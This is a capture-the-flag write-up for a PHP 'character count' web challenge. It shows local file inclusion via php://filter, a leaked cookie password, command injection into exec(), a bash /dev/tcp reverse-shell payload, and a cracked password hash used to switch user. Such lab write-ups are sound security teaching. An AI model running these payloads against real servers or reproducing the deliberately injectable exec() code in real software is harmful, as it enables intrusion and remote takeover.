# Body Count

Author: [AJ1479](https://github.com/AJ1479) and [roerohan](https://github.com/roerohan)

## Description

This challenge is based on PHP code injection to set up a reverse shell. 

## Requirements

- Docker: [Dockerfile](./Dockerfile)

## Sources

```
Here's a character count service for you!
```

## Exploit

First, when you visit the website, you get redirected to `/?file=wc.php`. This might indicate that you can include files from the server, such as `/?file=/etc/passwd`. You can see in this file that there's a user called `ctf`, but that's not useful yet. Moving on, you can find out that there's a `robots.txt` file at `?file=robots.txt`.

```
Disallow: /?file=checkpass.php
```

Visiting that URL, you get redirected back to `/wc.php`. However, it maybe that there's some code in `checkpass.php` that might be important. If you request it in `python`, you can see:

```python
>>> r = requests.get('http://chall.csivit.com:30202?file=checkpass.php', allow_redirects=False)
>>> r.text
'IMPORTANT!!! The page is still under development. This has a secret, do not push this page.'
```

We can try to view the source of this page with the help of `php://filter`. Visit the website:

```
/?file=php://filter/convert.base64-encode/resource=checkpass.php

PD9waHAKJHBhc3N3b3JkID0gIncwcmRjMHVudDEyMyI7Ci8vIENvb2tpZSBwYXNzd29yZC4KZWNobyAiSU1QT1JUQU5UISEhIFRoZSBwYWdlIGlzIHN0aWxsIHVuZGVyIGRldmVsb3BtZW50LiBUaGlzIGhhcyBhIHNlY3JldCwgZG8gbm90IHB1c2ggdGhpcyBwYWdlLiI7CgpoZWFkZXIoJ0xvY2F0aW9uOiAvJyk7Cg==
```

When you base64 decode this, you get:

```bash
$ echo "PD9waHAKJHBhc3N3b3JkID0gIncwcmRjMHVudDEyMyI7Ci8vIENvb2tpZSBwYXNzd29yZC4KZWNobyAiSU1QT1JUQU5UISEhIFRoZSBwYWdlIGlzIHN0aWxsIHVuZGVyIGRldmVsb3BtZW50LiBUaGlzIGhhcyBhIHNlY3JldCwgZG8gbm90IHB1c2ggdGhpcyBwYWdlLiI7CgpoZWFkZXIoJ0xvY2F0aW9uOiAvJyk7Cg==" | base64 -d
<?php
$password = "w0rdc0unt123";
// Cookie password.
echo "IMPORTANT!!! The page is still under development. This has a secret, do not push this page.";

header('Location: /');
```

So, we can see a suspicious `$password` variable. Let's also check the source for `wc.php`. 

```bash
$ echo "PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KCjxoZWFkPgogICAgPG1ldGEgY2hhcnNldD0iVVRGLTgiPgogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiPgogICAgPG1ldGEgaHR0cC1lcXVpdj0iWC1VQS1Db21wYXRpYmxlIiBjb250ZW50PSJpZT1lZGdlIj4KICAgIDx0aXRsZT53YyBhcyBhIHNlcnZpY2U8L3RpdGxlPgogICAgPHN0eWxlPgogICAgICAgIGh0bWwsCiAgICAgICAgYm9keSB7CiAgICAgICAgICAgIG92ZXJmbG93OiBub25lOwogICAgICAgICAgICBtYXgtaGVpZ2h0OiAxMDB2aDsKICAgICAgICB9CiAgICA8L3N0eWxlPgo8L2hlYWQ+Cgo8Ym9keSBzdHlsZT0iaGVpZ2h0OiAxMDB2aDsgdGV4dC1hbGlnbjogY2VudGVyOyBiYWNrZ3JvdW5kLWNvbG9yOiBibGFjazsgY29sb3I6IHdoaXRlOyBkaXNwbGF5OiBmbGV4OyBmbGV4LWRpcmVjdGlvbjogY29sdW1uOyBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjsiPgogICAgPD9waHAKICAgIGluaV9zZXQoJ21heF9leGVjdXRpb25fdGltZScsIDUpOwogICAgaWYgKCRfQ09PS0lFWydwYXNzd29yZCddICE9PSBnZXRlbnYoJ1BBU1NXT1JEJykpIHsKICAgICAgICBzZXRjb29raWUoJ3Bhc3N3b3JkJywgJ1BBU1NXT1JEJyk7CiAgICAgICAgZGllKCdTb3JyeSwgb25seSBwZW9wbGUgZnJvbSBjc2l2aXQgYXJlIGFsbG93ZWQgdG8gYWNjZXNzIHRoaXMgcGFnZS4nKTsKICAgIH0KICAgID8+CgogICAgPGgxPkNoYXJhY3RlciBDb3VudCBhcyBhIFNlcnZpY2U8L2gxPgogICAgPGZvcm0+CiAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgdmFsdWU9IndjLnBocCIgbmFtZT0iZmlsZSI+CiAgICAgICAgPHRleHRhcmVhIHN0eWxlPSJib3JkZXItcmFkaXVzOiAxcmVtOyIgdHlwZT0idGV4dCIgbmFtZT0idGV4dCIgcm93cz0zMCBjb2xzPTEwMD48L3RleHRhcmVhPjxiciAvPgogICAgICAgIDxpbnB1dCB0eXBlPSJzdWJtaXQiPgogICAgPC9mb3JtPgogICAgPD9waHAKICAgIGlmIChpc3NldCgkX0dFVFsidGV4dCJdKSkgewogICAgICAgICR0ZXh0ID0gJF9HRVRbInRleHQiXTsKICAgICAgICBlY2hvICI8aDI+VGhlIENoYXJhY3RlciBDb3VudCBpczogIiAuIGV4ZWMoJ3ByaW50ZiBcJycgLiAkdGV4dCAuICdcJyB8IHdjIC1jJykgLiAiPC9oMj4iOwogICAgfQogICAgPz4KPC9ib2R5PgoKPC9odG1sPg==" | base64 -d
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>wc as a service</title>
    <style>
        html,
        body {
            overflow: none;
            max-height: 100vh;
        }
    </style>
</head>

<body style="height: 100vh; text-align: center; background-color: black; color: white; display: flex; flex-direction: column; justify-content: center;">
    <?php
    ini_set('max_execution_time', 5);
    if ($_COOKIE['password'] !== getenv('PASSWORD')) {
        setcookie('password', 'PASSWORD');
        die('Sorry, only people from csivit are allowed to access this page.');
    }
    ?>

    <h1>Character Count as a Service</h1>
    <form>
        <input type="hidden" value="wc.php" name="file">
        <textarea style="border-radius: 1rem;" type="text" name="text" rows=30 cols=100></textarea><br />
        <input type="submit">
    </form>
    <?php
    if (isset($_GET["text"])) {
        $text = $_GET["text"];
        echo "<h2>The Character Count is: " . exec('printf \'' . $text . '\' | wc -c') . "</h2>";
    }
    ?>
</body>

</html>%     
```

Here, you can see that a `password` cookie is being checked. Enter the password from the `$password` variable as the cookie (`w0rdc0unt123`), then you can see the webpage.
<br />

You also see in the source of `wc.php` that the input `$text` is obtained from the get param `text`, and is passed into `exec`. 
So, we can get remote code execution from here! Try with the payload:

```
'; ls #
```

You can see the following output:

```
The Character Count is: wc.php
```

But, we know for a fact that there's also `robots.txt` and `checkpass.php` in this folder. You then findout that `echo exec(...)` returns only the last line of the output. We have 2 choices from here. Either we do `'; <command> | tr '\n' '' #` to replace all new-lines with spaces, throughout the rest of the exploit. Otherwise, you can try to spawn a reverse shell, and then use your server to navigate through the directories. I'm going to use the `reverse shell` method.

```
'; bash -c "bash -i >& /dev/tcp/your.server.ip.address/8000 0>&1" #
```

> Note: Replace `your.server.ip.address` with your server's IP.

Once you pass this in the input, you get a shell on your server!

```bash
www-data@9c9f6ae73053:/var/www/html$ ls      
ls
checkpass.php
index.php
robots.txt
wc.php
www-data@9c9f6ae73053:/var/www/html$ 
```

Let's navigate through the file system and see if there's something interesting. You can see there's a folder `/ctf`. Inside that, there are a lot of folders.

```bash
www-data@9c9f6ae73053:/ctf$ ls
ls
README
avenged
dream
findaas
led
system
www-data@9c9f6ae73053:/ctf$ 
```

There's also a `findaas` bash script, which you can use to locate `flag.txt` (or you can use the find command directly).

```bash
www-data@9c9f6ae73053:/ctf$ ./findaas flag.txt
./findaas flag.txt
Enter a filename and find it here!
./system/of/a/down/flag.txt
www-data@9c9f6ae73053:/ctf$ 
```

Now that you know where the flag is, you can just cat the flag!

```
www-data@9c9f6ae73053:/ctf$ cat ./system/of/a/down/flag.txt
cat ./system/of/a/down/flag.txt
cat: ./system/of/a/down/flag.txt: Permission denied
www-data@9c9f6ae73053:/ctf$ 
```

But there's a catch. You don't have permission to cat the flag. However, when you see the `README` file, it says that the password hash for `ctf` is `6f246c872cbf0b7fd7530b7aa235e67e`. You can bruteforce that using offline tools or using [crackstation.net](https://crackstation.net/), and find out that the password is `csictf` (maybe you could've guessed it too). Now, you can just switch to the user `ctf` and print the flag!

```bash
www-data@9c9f6ae73053:/ctf$ su ctf
su ctf
Password: csictf
cat ./system/of/a/down/flag.txt
csictf{1nj3ct10n_15_p41nfu1}
```

Congrats! You have found the flag.

The flag is:

```
csictf{1nj3ct10n_15_p41nfu1}
```